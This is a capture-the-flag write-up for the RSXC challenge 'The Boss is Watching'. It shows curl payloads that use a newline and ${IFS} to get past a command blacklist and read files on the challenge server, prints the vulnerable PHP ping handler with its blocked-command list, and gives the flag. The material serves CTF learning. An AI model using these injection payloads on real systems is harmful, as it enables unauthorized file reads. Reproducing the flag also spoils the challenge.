4 - The Boss is Watching
464
Once in a remote Norwegian town, a group of skilled security professionals had convened in a fancy cabin to collaborate and achieve their objectives. On their network, they found a number of challenges that required their collective expertise. Do you have what it takes to tackle these challenges too?

http://rsxc.no:9008

# Note

Number 3 to 6 I used a few minutes to check out, then I randomly tested if the flag was unprotected as it is in the same folder as the `index.php` and sure enough. I could just access `flag.txt` by adding that to the URL. So my points skyrocketed at that moment. 

I knew that was not the intended solution so even if I got the flag I wanted to complete it "legally" before continuing so I could write a proper writeup.

**Update**: This was fixed later on and flag is now in `/flag.txt`. This writeup still works the same just add a `/`

# Writup

Guessing that it is harder than 3, I just try this command anyway:

```console
toffe@kali:~$ curl http://rsxc.no:9007 -d "ip=
cat\${IFS}flag.txt"
```

`Illegal Command Discovered` - So no character, it does not like `cat`? I tried a whole lot but then I remember tail, head, more, less.. Lets try `tail`

```console
toffe@kali:~$ curl http://rsxc.no:9008 -d "ip=
tail\${IFS}flag.txt"
```

Bingo! Extracting index.php here fails with `tail` but adding `-n9999` works and I get this output:

```php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $ip = $_POST['ip'];
    
    if (preg_match('/[&|;`\'" ]/',$ip)) {
        echo "<p align='center' style='color:red;'>Illegal Input Discovered</p>";
        die();
    }
    
    $blocked_commands = array("dir", "strings", "ls", "cat", "whoami", "pwd", "ps", "id", "echo", "kill", "touch", "more");
    foreach($blocked_commands as $command) {
        if (stripos($ip, $command) !== false) {
            echo "<p align='center' style='color:red;'>Illegal Command Discovered</p>";
            die();
        }
    }
    
    $output = shell_exec("ping -c 1 $ip");
    echo "<pre class='output'>$output</pre>";
}
```

Oh well.. They keep locking us out! :)


# Flag

```
RSXC{GREAT_JOB_YOU_FIGURED_OUT_HOW_TO_CIRCUMVENT_THE_BLOCKED_COMMANDS}
```